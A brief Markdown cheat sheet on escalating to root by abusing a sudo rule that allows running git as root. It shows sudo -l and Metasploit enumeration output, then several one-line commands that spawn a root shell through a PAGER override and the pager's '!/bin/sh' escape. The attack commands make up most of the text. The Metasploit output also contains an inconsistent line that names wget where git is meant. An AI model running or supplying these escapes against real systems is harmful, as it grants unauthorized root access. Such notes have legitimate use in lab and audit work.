# Git

## Living off the Land

### Enumerate

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/git
```

### Exploit

#### Spawn Shell

```
$ sudo PAGER='sh -c "exec sh 0<&1"' git -p help

$ sudo PAGER='sh -c "exec bash 0<&1"' git -p help
```

Interactive mode through configuration.

```
$ sudo git -p help config
!/bin/sh

$ sudo git -p help config
!/bin/bash
```

Interactive mode through `branch`.

```
$ sudo git branch --help config
!/bin/sh

$ sudo git branch --help config
!/bin/bash
```

## Metasploit

### Enumerate

```
meterpreter > run post/multi/recon/sudo_commands

[+] /usr/bin/wget matches known privesc executable 'git' !

Sudo Commands
=============

  Command            RunAsUsers  RunAsGroups  Password?  Privesc?
  -------            ----------  -----------  ---------  --------
  /usr/bin/git       root                                True

[+] Output stored in: /root/.msf4/loot/20220523174649_default_10.10.140.168_sudo.commands_049317.txt
```